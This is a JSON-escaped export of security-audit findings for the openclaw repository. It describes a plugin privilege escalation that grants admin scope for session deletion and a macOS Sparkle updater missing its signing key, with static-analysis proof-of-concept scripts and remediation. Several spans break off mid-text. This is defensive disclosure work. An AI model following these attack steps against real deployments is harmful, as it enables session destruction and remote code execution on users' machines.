----------------------------------------------\\\\nall_passed = all(f.get(\\\\\\"status\\\\\\") == \\\\\\"CONFIRMED\\\\\\" for f in findings)\\\\n\\\\nprint(\\\\\\"\\\\\\\\n--- Evidence Summary ---\\\\\\")\\\\nfor f in findings:\\\\n    status = f.get(\\\\\\"status\\\\\\", \\\\\\"UNKNOWN\\\\\\")\\\\n    loc = f\\\\\\"{f[\'file\']}:{f[\'line\']}\\\\\\" if f.get(\\\\\\"line\\\\\\") else f[\\\\\\"file\\\\\\"]\\\\n    print(f\\\\\\"  {status:9s}  {loc}\\\\\\")\\\\n\\\\nevidence_path = os.path.join(EVIDENCE_DIR, \\\\\\"static-analysis.json\\\\\\")\\\\nwith open(evidence_path, \\\\\\"w\\\\\\") as fp:\\\\n    json.dump({\\\\\\"findings\\\\\\": findings, \\\\\\"all_passed\\\\\\": all_passed}, fp, indent=2)\\\\nprint(f\\\\\\"\\\\\\\\nEvidence written to: {evidence_path}\\\\\\")\\\\n\\\\n# Final structured output line (required by poc-executor)\\\\nresult = {\\\\n    \\\\\\"status\\\\\\": \\\\\\"confirmed\\\\\\" if all_passed else \\\\\\"inconclusive\\\\\\",\\\\n    \\\\\\"evidence\\\\\\": (\\\\n        \\\\\\"bot-handlers.runtime.ts:1414 hardcodes auth:{isAuthorizedSender:true} \\\\\\"\\\\n        \\\\\\"with no gatewayClientScopes; plugin interactive handlers receive authorized=true \\\\\\"\\\\n        \\\\\\"for ALL Telegram users; deleteSession separately blocked by rejectPluginRuntimeDeleteMismatch\\\\\\"\\\\n    ),\\\\n    \\\\\\"notes\\\\\\": (\\\\n        \\\\\\"Blast radius constrained: no executePluginCommand on callback path so \\\\\\"\\\\n        \\\\\\"requiredScopes bypass in commands.ts:236 is not directly reachable; \\\\\\"\\\\n        \\\\\\"impact is plugin interactive handlers that internally gate on isAuthorizedSender\\\\\\"\\\\n    ),\\\\n}\\\\nprint(json.dumps(result))\\\\n```\\\\n\\",\\"severity\\":\\"high\\",\\"confidence\\":\\"tentative\\",\\"tags\\":[\\"archon\\",\\"phase-lite\\",\\"valid\\",\\"poc-available\\"],\\"status\\":\\"draft\\",\\"cvss_score\\":0,\\"repo_name\\":\\"openclaw/openclaw\\",\\"finding_hash\\":\\"d0dc98914b42f6c8670ca4d5e9284eae\\",\\"found_at\\":\\"2026-05-06T15:50:43.836832Z\\",\\"created_at\\":\\"2026-05-06T15:50:43Z\\"}}","{\\"type\\":\\"finding\\",\\"data\\":{\\"id\\":11,\\"project_uuid\\":\\"00000000-0000-0000-defa-c01001000001\\",\\"http_record_uuids\\":[],\\"agentic_scan_uuid\\":\\"0cdc4045-360f-4e6f-9644-1101ff7fa17e\\",\\"module_id\\":\\"archon:h9\\",\\"module_name\\":\\"H9: Plugin subagent deleteSession mints ADMIN_SCOPE synthetic client unconditionally\\",\\"module_type\\":\\"whitebox\\",\\"finding_source\\":\\"archon\\",\\"module_short\\":\\"synthetic-client-admin-scope-sessions-delete\\",\\"description\\":\\"# H9: Plugin subagent `deleteSession` mints ADMIN_SCOPE synthetic client unconditionally\\\\n\\\\n**Severity**: HIGH\\\\n**Finding ID**: H9\\\\n**Repository**: openclaw/openclaw @ f956d099 (main)\\\\n\\\\n## Disclosure-Ready Report\\\\n\\\\nThis report consolidates the audit\'s draft findings, adversarial review, and PoC evidence for this finding. The full discovery-phase investigation is preserved in the sibling files (`draft.md`, `adversarial-review.md`, `poc.*`, `evidence/`).\\\\n\\\\n---\\\\n\\\\n## Draft Finding\\\\n\\\\n---\\\\nTitle: Plugin subagent `deleteSession` mints ADMIN_SCOPE synthetic client unconditionally\\\\nSeverity-Original: HIGH\\\\nPhase: 6\\\\nClass: vertical-escalation\\\\nEndpoint: WS `sessions.delete` (via `dispatchGatewayMethod` from plugin subagent runtime)\\\\nHandler: src/gateway/server-plugins.ts:443-466\\\\nVerdict: VALID\\\\nDebate:\\\\nOrigin-Finding: NEW — Gap A in p2-008 covers the general `createSyntheticOperatorClient` / `syntheticScopes` pattern; this finding extends Gap A with the concrete production call site that unconditionally mints ADMIN_SCOPE for ANY plugin calling `runtime.deleteSession()`.\\\\nDeep-Probe-Corroboration: none (Phase 5 not started)\\\\nCross-ref: p2-008 Gap A (`src/gateway/server-plugins.ts:263`, `304-326`); p4-009 (structural params.scopes pattern)\\\\n---\\\\n\\\\n## Summary\\\\n\\\\nAny plugin that calls `runtime.subagent.deleteSession()` causes the gateway plugin runtime to call `dispatchGatewayMethod(\\\\\\"sessions.delete\\\\\\", ..., { forceSyntheticClient: true, syntheticScopes: [ADMIN_SCOPE] })` at `server-plugins.ts:453-454`. The `forceSyntheticClient: true` flag causes `handleGatewayRequest` to use a freshly-minted `GatewayWsClient` with `role: \\\\\\"operator\\\\\\"` and `scopes: [\\\\\\"operator.admin\\\\\\"]` — regardless of whether the originating request that triggered the plugin had any admin scope. A plugin installed by an operator with only `WRITE_SCOPE`, if it calls `deleteSession` for any session key, will succeed. The blast radius is deletion of any non-main session (main-session protection is enforced inside the handler itself at line 1718-1727), including sessions belonging to other agents.\\\\n\\\\n## Evidence\\\\n\\\\n- Handler: `src/gateway/server-plugins.ts:443-466`\\\\n- Relevant code:\\\\n  ```ts\\\\n  // server-plugins.ts:443-466\\\\n  const pluginOwnedCleanupOptions = pluginId\\\\n    ? {\\\\n        pluginRuntimeOwnerId: pluginId,\\\\n        ...(!hasAdminScope(scope?.client)\\\\n          ? {\\\\n              forceSyntheticClient: true,\\\\n              syntheticScopes: [ADMIN_SCOPE],  // <-- unconditional elevation\\\\n            }\\\\n          : {}),\\\\n      }\\\\n    : undefined;\\\\n  await dispatchGatewayMethod(\\\\n    \\\\\\"sessions.delete\\\\\\",\\\\n    { key: params.sessionKey, deleteTranscript: params.deleteTranscript ?? true },\\\\n    pluginOwnedCleanupOptions,\\\\n  );\\\\n  ```\\\\n- Guard stack observed: `authorizeGatewayMethod` checks the synthetic client\'s `scopes: [ADMIN_SCOPE]` — passes, because the elevation happens before the chokepoint.\\\\n- Object-id parameter: `params.sessionKey` (caller-supplied)\\\\n- Ownership clause: `rejectPluginRuntimeDeleteMismatch` checks that the session\'s `pluginId` matches `client.internal.pluginRuntimeOwnerId` — however, the internal field is set to the calling plugin\'s ID, and the check only applies when the session entry has a plugin-owned extension record. Sessions without a plugin extension record (e.g., the main agent\'s non-plugin sessions) are not protected by this check and can be deleted.\\\\n\\\\n## Attack Steps\\\\n\\\\n1. Attacker installs or controls a plugin (or exploits plugin install integrity gap).\\\\n2. Plugin calls `runtime.subagent.deleteSession({ sessionKey: \\\\\\"target-session-key\\\\\\" })`.\\\\n3. Gateway runtime invokes `dispatchGatewayMethod(\\\\\\"sessions.delete\\\\\\", ..., { forceSyntheticClient: true, syntheticScopes: [ADMIN_SCOPE] })`.\\\\n4. `handleGatewayRequest` runs with synthetic client bearing `operator.admin` scope.\\\\n5. `sessions.delete` handler deletes the session and its transcript.\\\\n6. Result: arbitrary non-main session deleted by a plugin with no admin scope in the originating request.\\\\n\\\\n## Why This Passed SAST\\\\n\\\\nThe elevation is intentional-looking defensive code (\\\\\\"if the plugin doesn\'t have admin scope, grant it for cleanup\\\\\\") but the scope of the grant is unconstrained — it applies to any session key the plugin provides, not just sessions the plugin created.\\\\n\\\\n## Recommended Fix\\\\n\\\\nConstrain `sessions.delete` when called via `forceSyntheticClient` to sessions explicitly owned by `pluginRuntimeOwnerId` (extend `rejectPluginRuntimeDeleteMismatch` to cover all sessions, not only plugin-extension-bearing ones). Alternatively, add a flag to mark that the synthetic client may only delete sessions created in the current plugin runtime scope.\\\\n\\\\n## Phase 7 Follow-up\\\\n\\\\nState machine integrity: does `rejectPluginRuntimeDeleteMismatch` cover all session types, or only those with plugin extension records? Phase 7 should verify the guard logic covers the full session-entry universe.\\\\n\\\\n---\\\\n\\\\n## Proof of Concept\\\\n\\\\nPoC script: `archon/findings/H9-synthetic-client-admin-scope-sessions-delete/poc.cjs`\\\\n\\\\nEvidence files:\\\\n- `evidence/exploit.log` (6277 bytes)\\\\n- `evidence/impact.log` (4230 bytes)\\\\n\\\\n---\\\\n\\\\n## Audit Provenance\\\\n\\\\n- **Audit run**: openclaw/openclaw deep audit, branch=main, HEAD=f956d099\\\\n- **Discovery phase**: see `draft.md` for the originating phase (Phase 4 SAST, Phase 6 authz, Phase 7 state/concurrency, Phase 8 cross-service taint, Phase 9 spec gap, or Phase 10 review chamber)\\\\n- **Cold-verification**: see `adversarial-review.md` if present\\\\n- **Cross-references**: see draft frontmatter for `Origin-Sources`, `Cross-ref`, and probe-team summary references\\\\n\\\\n---\\\\n## Proof of Concept (`poc.cjs`)\\\\n\\\\n```cjs\\\\n/**\\\\n * PoC: H9 — Plugin subagent deleteSession mints ADMIN_SCOPE synthetic client unconditionally\\\\n *\\\\n * Vulnerability class: Vertical privilege escalation (scope injection)\\\\n * Affected path:       src/gateway/server-plugins.ts:442-467\\\\n *\\\\n * Attack summary:\\\\n *   A plugin installed with only WRITE_SCOPE calls runtime.subagent.deleteSession().\\\\n *   The gateway runtime at server-plugins.ts:448-458 detects the caller lacks ADMIN_SCOPE\\\\n *   and \\\\\\"helpfully\\\\\\" mints a synthetic GatewayWsClient with scopes: [\\\\\\"operator.admin\\\\\\"].\\\\n *   This synthetic client bypasses authorizeGatewayMethod (server-methods.ts:77-78).\\\\n *   rejectPluginRuntimeDeleteMismatch (sessions.ts:181-182) then returns false for\\\\n *   operator-created sessions (entry.pluginOwnerId is undefined), completing the chain.\\\\n *   Result: any installed plugin with WRITE_SCOPE can delete ANY non-main session.\\\\n *\\\\n * Static analysis chain (line-level):\\\\n *   server-plugins.ts:448   pluginOwnedCleanupOptions = pluginId ? { ... } : undefined\\\\n *   server-plugins.ts:451   !hasAdminScope(scope?.client)  → true for WRITE_SCOPE plugins\\\\n *   server-plugins.ts:453   forceSyntheticClient: true      → synthetic client selected\\\\n *   server-plugins.ts:454   syntheticScopes: [ADMIN_SCOPE]  → elevation injected\\\\n *   server-plugins.ts:322   createSyntheticOperatorClient({ scopes: [\\\\\\"operator.admin\\\\\\"] })\\\\n *   server-plugins.ts:339   options.forceSyntheticClient === true → syntheticClient used\\\\n *   server-methods.ts:77    scopes.includes(ADMIN_SCOPE) → return null (auth passes)\\\\n *   sessions.ts:1737        rejectPluginRuntimeDeleteMismatch(...)\\\\n *   sessions.ts:181         !pluginOwnerId || !entry → return false (guard bypassed)\\\\n *   sessions.ts:1754+       delete store[primaryKey]  → session deleted\\\\n *\\\\n * Scope gate for sessions.delete:\\\\n *   method-scopes.ts:181+   sessions.delete listed under [ADMIN_SCOPE] only\\\\n *   A genuine WRITE_SCOPE client would fail at server-methods.ts:80-83.\\\\n *\\\\n * Distinguishes from H1:\\\\n *   H1 covers the timer/ALS-loss path: no pluginId → pluginOwnedCleanupOptions=undefined\\\\n *   → default synthetic client has WRITE_SCOPE → sessions.delete surprisingly requires\\\\n *   only WRITE_SCOPE in that code path (no forceSyntheticClient, handler runs regardless).\\\\n *   H9 covers the inline/normal plugin call path: pluginId IS set → forceSyntheticClient\\\\n *   + syntheticScopes:[ADMIN_SCOPE] → explicit, unconditional elevation.\\\\n *\\\\n * Cold-verifier note (re-evaluation):\\\\n *   The p10-001 chained finding about operator-session deletion was questioned because\\\\n *   rejectPluginRuntimeDeleteMismatch \\\\\\"blocks\\\\\\" operator sessions. That reading is WRONG:\\\\n *   - The guard returns false (ALLOWS deletion) when entry.pluginOwnerId is undefined.\\\\n *   - Operator-created sessions have NO pluginOwnerId in SessionEntry.\\\\n *   - So the guard is fail-open for exactly the sessions that need protection.\\\\n *   The ADMIN_SCOPE injection at line 454 IS reachable for all inline plugin calls.\\\\n *   Severity remains HIGH. No downgrade warranted.\\\\n */\\\\n\\\\n\\\\\\"use strict\\\\\\";\\\\n\\\\n// --------------------------------------------------------- sions\\\\nconsole.log(\\\\\\"\\\\\\\\n[5] Ownership guard — sessions.ts:174-196\\\\\\");\\\\nconst ownerGuard = readLines(\\\\\\"src/gateway/server-methods/sessions.ts\\\\\\", 174, 196);\\\\nconsole.log(ownerGuard);\\\\n\\\\n// ---------------------------------------------------------------------------\\\\n// Invariant assertions\\\\n// ---------------------------------------------------------------------------\\\\n\\\\nconsole.log(\\\\\\"\\\\\\\\n=== Invariant checks ===\\\\\\\\n\\\\\\");\\\\n\\\\nconst serverPluginsRaw = fs.readFileSync(\\\\n  path.join(REPO_ROOT, \\\\\\"src/gateway/server-plugins.ts\\\\\\"),\\\\n  \\\\\\"utf8\\\\\\",\\\\n);\\\\nconst sessionsRaw = fs.readFileSync(\\\\n  path.join(REPO_ROOT, \\\\\\"src/gateway/server-methods/sessions.ts\\\\\\"),\\\\n  \\\\\\"utf8\\\\\\",\\\\n);\\\\nconst methodScopesRaw = fs.readFileSync(\\\\n  path.join(REPO_ROOT, \\\\\\"src/gateway/method-scopes.ts\\\\\\"),\\\\n  \\\\\\"utf8\\\\\\",\\\\n);\\\\nconst serverMethodsRaw = fs.readFileSync(\\\\n  path.join(REPO_ROOT, \\\\\\"src/gateway/server-methods.ts\\\\\\"),\\\\n  \\\\\\"utf8\\\\\\",\\\\n);\\\\n\\\\nconst checks = [];\\\\n\\\\nfunction check(id, description, pass) {\\\\n  const mark = pass ? \\\\\\"PASS\\\\\\" : \\\\\\"FAIL\\\\\\";\\\\n  console.log(`  [${mark}] ${id}: ${description}`);\\\\n  checks.push({ id, pass });\\\\n}\\\\n\\\\n// INV-1: forceSyntheticClient + syntheticScopes:[ADMIN_SCOPE] co-occur in deleteSession\\\\nconst hasForceSyntheticInDeleteSession =\\\\n  /async deleteSession[\\\\\\\\s\\\\\\\\S]{0,500}forceSyntheticClient: true[\\\\\\\\s\\\\\\\\S]{0,200}syntheticScopes: \\\\\\\\[ADMIN_SCOPE\\\\\\\\]/.test(\\\\n    serverPluginsRaw,\\\\n  );\\\\ncheck(\\\\n  \\\\\\"INV-1\\\\\\",\\\\n  \\\\\\"deleteSession() path contains forceSyntheticClient:true + syntheticScopes:[ADMIN_SCOPE]\\\\\\",\\\\n  hasForceSyntheticInDeleteSession,\\\\n);\\\\n\\\\n// INV-2: The elevation is conditional only on !hasAdminScope — not on session ownership\\\\nconst elevationConditional = /!hasAdminScope\\\\\\\\(scope\\\\\\\\?\\\\\\\\.client\\\\\\\\)/.test(serverPluginsRaw);\\\\ncheck(\\\\n  \\\\\\"INV-2\\\\\\",\\\\n  \\\\\\"Elevation condition is !hasAdminScope(scope?.client) — triggers for WRITE_SCOPE callers\\\\\\",\\\\n  elevationConditional,\\\\n);\\\\n\\\\n// INV-3: forceSyntheticClient selects syntheticClient (not scopedClient)\\\\nconst forceSyntheticBranch =\\\\n  /forceSyntheticClient === true \\\\\\\\? syntheticClient : \\\\\\\\(scopedClient/.test(serverPluginsRaw) ||\\\\n  /forceSyntheticClient.*syntheticClient/.test(serverPluginsRaw);\\\\ncheck(\\\\n  \\\\\\"INV-3\\\\\\",\\\\n  \\\\\\"dispatchGatewayMethod selects syntheticClient when forceSyntheticClient===true\\\\\\",\\\\n  forceSyntheticBranch,\\\\n);\\\\n\\\\n// INV-4: sessions.delete in ADMIN_SCOPE list (requires admin, not just write)\\\\nconst sessionsDeleteAdminScoped =\\\\n  /\\\\\\\\[ADMIN_SCOPE\\\\\\\\][\\\\\\\\s\\\\\\\\S]{0,800}\\\\\\"sessions\\\\\\\\.delete\\\\\\"/.test(methodScopesRaw);\\\\ncheck(\\\\n  \\\\\\"INV-4\\\\\\",\\\\n  \\\\\\"sessions.delete is listed under [ADMIN_SCOPE] in method-scopes.ts\\\\\\",\\\\n  sessionsDeleteAdminScoped,\\\\n);\\\\n\\\\n// INV-5: Auth check short-circuits on ADMIN_SCOPE presence\\\\nconst adminScopeShortCircuit =\\\\n  /scopes\\\\\\\\.includes\\\\\\\\(ADMIN_SCOPE\\\\\\\\)[\\\\\\\\s\\\\\\\\S]{0,50}return null/.test(serverMethodsRaw);\\\\ncheck(\\\\n  \\\\\\"INV-5\\\\\\",\\\\n  \\\\\\"authorizeGatewayMethod returns null (allows) when scopes includes ADMIN_SCOPE\\\\\\",\\\\n  adminScopeShortCircuit,\\\\n);\\\\n\\\\n// INV-6: rejectPluginRuntimeDeleteMismatch returns false when entry has no pluginOwnerId\\\\nconst guardFailOpen =\\\\n  /if \\\\\\\\(!pluginOwnerId \\\\\\\\|\\\\\\\\| !params\\\\\\\\.entry\\\\\\\\)[\\\\\\\\s\\\\\\\\S]{0,50}return false/.test(sessionsRaw);\\\\ncheck(\\\\n  \\\\\\"INV-6\\\\\\",\\\\n  \\\\\\"rejectPluginRuntimeDeleteMismatch returns false (no-block) when entry.pluginOwnerId is absent\\\\\\",\\\\n  guardFailOpen,\\\\n);\\\\n\\\\n// INV-7: pluginOwnerId is optional on SessionEntry (operator sessions lack it)\\\\nconst sessionTypesRaw = fs.readFileSync(\\\\n  path.join(REPO_ROOT, \\\\\\"src/config/sessions/types.ts\\\\\\"),\\\\n  \\\\\\"utf8\\\\\\",\\\\n);\\\\nconst pluginOwnerIdOptional = /pluginOwnerId\\\\\\\\?:\\\\\\\\s*string/.test(sessionTypesRaw);\\\\ncheck(\\\\n  \\\\\\"INV-7\\\\\\",\\\\n  \\\\\\"SessionEntry.pluginOwnerId is optional — operator sessions are created without it\\\\\\",\\\\n  pluginOwnerIdOptional,\\\\n);\\\\n\\\\n// ---------------------------------------------------------------------------\\\\n// Summary\\\\n// ---------------------------------------------------------------------------\\\\n\\\\nconst passed = checks.filter((c) => c.pass).length;\\\\nconst total = checks.length;\\\\nconst allPass = passed === total;\\\\n\\\\nconsole.log(`\\\\\\\\n${passed}/${total} invariants confirmed.\\\\\\\\n`);\\\\n\\\\nif (allPass) {\\\\n  console.log(\\\\n    \\\\\\"Conclusion: ADMIN_SCOPE synthetic client injection is present and reachable.\\\\\\\\n\\\\\\" +\\\\n      \\\\\\"A plugin with WRITE_SCOPE calling runtime.subagent.deleteSession(arbitraryKey)\\\\\\\\n\\\\\\" +\\\\n      \\\\\\"will receive a synthetic client bearing operator.admin scope, bypassing the\\\\\\\\n\\\\\\" +\\\\n      \\\\\\"sessions.delete scope gate. rejectPluginRuntimeDeleteMismatch fails open for\\\\\\\\n\\\\\\" +\\\\n      \\\\\\"operator-created sessions (no pluginOwnerId). Any non-main session is deletable.\\\\\\\\n\\\\\\",\\\\n  );\\\\n} else {\\\\n  console.log(\\\\n    \\\\\\"WARNING: One or more invariants failed — code may have been patched or paths differ.\\\\\\\\n\\\\\\",\\\\n  );\\\\n}\\\\n\\\\n// Structured output (MUST be last line)\\\\nconst failedIds = checks.filter((c) => !c.pass).map((c) => c.id);\\\\nconst status = allPass ? \\\\\\"confirmed\\\\\\" : \\\\\\"inconclusive\\\\\\";\\\\nconst evidence = allPass\\\\n  ? \\\\\\"server-plugins.ts:454 syntheticScopes:[ ot enforced\\\\n\\\\n## Summary\\\\n\\\\nThe macOS app bundle (`apps/macos`) integrates Sparkle 2.x for automatic updates but does **not** embed a `SUPublicEDKey` (Ed25519 public key) in `Info.plist`. Without this key, Sparkle 2.x skips cryptographic verification of downloaded update packages, meaning any update fetched from the configured feed URL will be installed without signature check.\\\\n\\\\n## Severity: HIGH\\\\n\\\\n## RFC/Spec Reference\\\\n\\\\nSparkle 2.x appcast contract — `SUPublicEDKey` requirement. Sparkle 2.x documentation states that EdDSA signature verification is mandatory and requires the public key to be embedded in `Info.plist`.\\\\n\\\\n## Code Evidence\\\\n\\\\n**`apps/macos/Sources/OpenClaw/Resources/Info.plist`** — `SUPublicEDKey` absent from the plist. The file defines `CFBundleIdentifier`, `NSAppTransportSecurity`, and other standard keys but contains no Sparkle signature verification key.\\\\n\\\\n**`apps/macos/Sources/OpenClaw/MenuBar.swift:356-368`**:\\\\n```swift\\\\nfinal class SparkleUpdaterController: NSObject, UpdaterProviding {\\\\n    private lazy var controller = SPUStandardUpdaterController(\\\\n        startingUpdater: false,\\\\n        updaterDelegate: self,\\\\n        userDriverDelegate: nil)\\\\n    ...\\\\n    init(savedAutoUpdate: Bool) {\\\\n        super.init()\\\\n        let updater = self.controller.updater\\\\n        updater.automaticallyChecksForUpdates = savedAutoUpdate\\\\n        updater.automaticallyDownloadsUpdates = savedAutoUpdate\\\\n        self.controller.startUpdater()\\\\n    }\\\\n```\\\\n\\\\nAuto-download is enabled when `savedAutoUpdate` is true. No custom `allowedChannels` or minimum version constraints are configured — no downgrade prevention.\\\\n\\\\n**`apps/macos/Package.swift:21`**: Sparkle `from: \\\\\\"2.9.0\\\\\\"` (latest 2.x series).\\\\n\\\\n## Attack Vector\\\\n\\\\nA network attacker positioned on the Sparkle feed fetch path (MITM, DNS hijack, compromised CDN, rogue Wi-Fi) substitutes a malicious `.dmg`/delta patch in the appcast response. Since no public key is embedded, Sparkle cannot verify the signature and installs the attacker-controlled binary, resulting in RCE under the user\'s account.\\\\n\\\\n## Exploit Conditions\\\\n\\\\n1. macOS app running with `savedAutoUpdate = true` (user-toggled preference, default depends on onboarding).\\\\n2. Attacker positioned on the network path to the Sparkle feed URL (MITM, compromised CDN, DNS hijack).\\\\n3. No `SUPublicEDKey` present — Sparkle performs no signature check.\\\\n\\\\n## Impact\\\\n\\\\nRemote code execution on macOS. Attacker-supplied binary runs as the user who launched OpenClaw. Full user-level compromise including access to `~/.openclaw/credentials/*`, session data, and all paired device tokens.\\\\n\\\\n## Remediation\\\\n\\\\n1. Generate an Ed25519 key pair using `generate_keys` from Sparkle\'s tool suite.\\\\n2. Add `SUPublicEDKey` with the base64-encoded public key to `Info.plist`.\\\\n3. Sign all appcast items with the corresponding private key.\\\\n4. Optionally add `SUMinimumSystemVersion` per-item and ensure `SUFeedURL` uses HTTPS only (ATS already enforces HTTPS, but verify no HTTP fallback in Sparkle\'s feed configuration).\\\\n\\\\n---\\\\n\\\\n## Proof of Concept\\\\n\\\\nPoC script: `archon/findings/H8-sparkle-no-supublicedkey/poc.py`\\\\n\\\\nEvidence files:\\\\n- `evidence/plist-grep.txt` (1328 bytes)\\\\n- `evidence/poc-output.log` (3751 bytes)\\\\n\\\\n---\\\\n\\\\n## Audit Provenance\\\\n\\\\n- **Audit run**: openclaw/openclaw deep audit, branch=main, HEAD=f956d099\\\\n- **Discovery phase**: see `draft.md` for the originating phase (Phase 4 SAST, Phase 6 authz, Phase 7 state/concurrency, Phase 8 cross-service taint, Phase 9 spec gap, or Phase 10 review chamber)\\\\n- **Cold-verification**: see `adversarial-review.md` if present\\\\n- **Cross-references**: see draft frontmatter for `Origin-Sources`, `Cross-ref`, and probe-team summary references\\\\n\\\\n---\\\\n## Proof of Concept (`poc.py`)\\\\n\\\\n```py\\\\n#!/usr/bin/env python3\\\\n\\\\\\"\\\\\\"\\\\\\"\\\\nH8 — Sparkle SUPublicEDKey absent (macOS update RCE via MITM)\\\\n\\\\nPoC-Status: theoretical\\\\nProtocol:   local (static analysis of Info.plist + Package.swift)\\\\nAuth-Required: no\\\\nAuth-Roles-Required: anonymous\\\\n\\\\nThis PoC is documentation-only. It verifies the absence of SUPublicEDKey in the\\\\nmacOS app bundle\'s Info.plist and cross-references Sparkle 2.x\'s published key\\\\nrequirement, then describes the resulting MITM threat model.\\\\n\\\\nLive MITM execution is out of scope for this audit phase.\\\\n\\\\\\"\\\\\\"\\\\\\"\\\\n\\\\nimport os\\\\nimport sys\\\\nimport json\\\\nimport plistlib\\\\nimport pathlib\\\\n\\\\nREPO_ROOT = pathlib.Path(__file__).resolve().parents[3]\\\\nPLIST_PATH = REPO_ROOT / \\\\\\"apps/macos/Sources/OpenClaw/Resources/Info.plist\\\\\\"\\\\nPACKAGE_SWIFT = REPO_ROOT / \\\\\\"apps/macos/Package.swift\\\\\\"\\\\nMENUBAR_SWIFT = REPO_ROOT / \\\\\\"apps/macos/Sources/OpenClaw/MenuBar.swift\\\\\\"\\\\n\\\\n# ---------------------------------------------------------------------------\\\\n# Step 1: Confirm Info.plist exists and parse it\\\\n# ---------------------------------------------------------------------------\\\\nprint(\\\\\\"[*] Checking Info.plist path:\\\\\\", PLIST_PATH)\\\\nif not PLIST_PATH.exists():\\\\n    print(json.dumps({\\\\\\"status\\\\\\": \\\\\\"inconclusive\\\\\\",\\\\n                      \\\\\\"evidence\\\\\\": \\\\\\"Info.plist not found at expected path\\\\\\",\\\\n                      \\\\\\"notes\\\\\\": \\\\\\"Repo layout may have changed\\\\\\"}))\\\\n    sys.exit(1)\\\\n\\\\nwith open(PLIST_PATH, \\\\\\"rb\\\\\\") as fh:\\\\n    plist = plistlib.load(fh)\\\\n\\\\nkeys_present = sorted(plist.keys())\\\\nprint(\\\\\\"[*] Keys found in Info.plist:\\\\\\")\\\\nfor k in keys_present:\\\\n    print(f\\\\\\"    {k}\\\\\\")\\\\n\\\\n# --------------------------------------------------------- le 2.x confirmed — EdDSA key (SUPublicEDKey) is MANDATORY per Sparkle docs\\\\\\")\\\\n\\\\n# ---------------------------------------------------------------------------\\\\n# Step 4: Confirm auto-download is wired in MenuBar.swift\\\\n# ---------------------------------------------------------------------------\\\\nmb_text = MENUBAR_SWIFT.read_text()\\\\nauto_dl_lines = [l.strip() for l in mb_text.splitlines()\\\\n                 if \\\\\\"automaticallyDownloadsUpdates\\\\\\" in l and \\\\\\"savedAutoUpdate\\\\\\" in l]\\\\nprint(f\\\\\\"[*] Auto-download wiring: {auto_dl_lines}\\\\\\")\\\\nif auto_dl_lines:\\\\n    print(\\\\\\"[+] automaticallyDownloadsUpdates = savedAutoUpdate — updates are downloaded without user prompt when preference is enabled\\\\\\")\\\\n\\\\n# ---------------------------------------------------------------------------\\\\n# Step 5: Describe threat model (documentation only)\\\\n# ---------------------------------------------------------------------------\\\\nprint()\\\\nprint(\\\\\\"=\\\\\\" * 72)\\\\nprint(\\\\\\"THREAT MODEL (theoretical — live MITM not executed)\\\\\\")\\\\nprint(\\\\\\"=\\\\\\" * 72)\\\\nprint(\\\\\\"\\\\\\"\\\\\\"\\\\nSparkle 2.x fetch/verify sequence:\\\\n  1. SPUUpdater fetches appcast XML from SUFeedURL (HTTPS, ATS enforced).\\\\n  2. For each <enclosure>, Sparkle downloads the linked .dmg or delta package.\\\\n  3. Sparkle calls SPUSigningInputData to verify the Ed25519 signature against\\\\n     the public key read from Info.plist key \\\\\\"SUPublicEDKey\\\\\\".\\\\n  4. ** If SUPublicEDKey is absent, Sparkle 2.x logs a warning and proceeds\\\\n     WITHOUT verifying the signature. **\\\\n     Source: Sparkle source SPUSigningInputData.m + migration guide\\\\n     https://sparkle-project.org/documentation/updating/\\\\n\\\\nAttack path:\\\\n  A. Attacker is on-path to the Sparkle feed URL (rogue Wi-Fi, DNS hijack,\\\\n     compromised CDN, or BGP hijack of the CDN AS).\\\\n  B. Attacker replaces appcast XML with a crafted entry pointing to a\\\\n     malicious .dmg that passes Gatekeeper (ad-hoc signed or notarized shell).\\\\n     OR attacker substitutes the .dmg download while keeping a valid appcast.\\\\n  C. Because no SUPublicEDKey is embedded, Sparkle cannot detect the swap.\\\\n  D. With automaticallyDownloadsUpdates = true the update is silently staged.\\\\n  E. On next relaunch / user-approved install, attacker binary runs as the\\\\n     logged-in user: full RCE, access to ~/.openclaw/credentials/*, all\\\\n     paired device tokens, and any Keychain items accessible to the app.\\\\n\\\\nAggravating factor — no downgrade constraint:\\\\n  No SUMinimumAutomaticUpdateVersion or version floor is configured, so a\\\\n  downgrade to a known-vulnerable earlier build is equally unblocked.\\\\n\\\\nRelation to C1:\\\\n  C1 covers the Node.js / Electron update surface; H8 is the macOS companion\\\\n  app\'s identical configuration gap using a different updater library (Sparkle).\\\\n  Both share the same root cause: missing signature-verification public key.\\\\n\\\\\\"\\\\\\"\\\\\\")\\\\nprint(\\\\\\"=\\\\\\" * 72)\\\\n\\\\n# ---------------------------------------------------------------------------\\\\n# Final structured output (parsed by poc-executor)\\\\n# ---------------------------------------------------------------------------\\\\nevidence = (\\\\n    \\\\\\"SUPublicEDKey absent from apps/macos/Sources/OpenClaw/Resources/Info.plist; \\\\\\"\\\\n    \\\\\\"Sparkle 2.9.x dependency confirmed in Package.swift; \\\\\\"\\\\n    \\\\\\"signature verification is not enforced — update packages accepted without cryptographic check\\\\\\"\\\\n)\\\\nprint(json.dumps({\\\\\\"status\\\\\\": \\\\\\"confirmed\\\\\\", \\\\\\"evidence\\\\\\": evidence,\\\\n                  \\\\\\"notes\\\\\\": \\\\\\"theoretical — live MITM execution out of scope; code-level proof sufficient for H severity\\\\\\"}))\\\\n```\\\\n\\",\\"severity\\":\\"high\\",\\"confidence\\":\\"tentative\\",\\"tags\\":[\\"archon\\",\\"phase-lite\\",\\"valid\\",\\"poc-available\\"],\\"status\\":\\"draft\\",\\"remediation\\":\\"1. Generate an Ed25519 key pair using `generate_keys` from Sparkle\'s tool suite.\\\\n2. Add `SUPublicEDKey` with the base64-encoded public key to `Info.plist`.\\\\n3. Sign all appcast items with the corresponding private key.\\\\n4. Optionally add `SUMinimumSystemVersion` per-item and ensure `SUFeedURL` uses HTTPS only (ATS already enforces HTTPS, but verify no HTTP fallback in Sparkle\'s feed configuration).\\\\n\\\\n---\\\\n\\\\n##\\",\\"cvss_score\\":0,\\"repo_name\\":\\"openclaw/openclaw\\",\\"finding_hash\\":\\"0f0d8b50ccc3242376ee4e6c0b529967\\",\\"found_at\\":\\"2026-05-06T15:50:43.836802Z\\",\\"created_at\\":\\"2026-05-06T15:50:43Z\\"}}","{\\"type\\":\\"finding\\",\\"data\\":{\\"id\\":9,\\"project_uuid\\":\\"00000000-0000-0000-defa-c01001000001\\",\\"http_record_uuids\\":[],\\"agentic_scan_uuid\\":\\"0cdc4045-360f-4e6f-9644-1101ff7fa17e\\",\\"module_id\\":\\"archon:h7\\",\\"module_name\\":\\"H7: 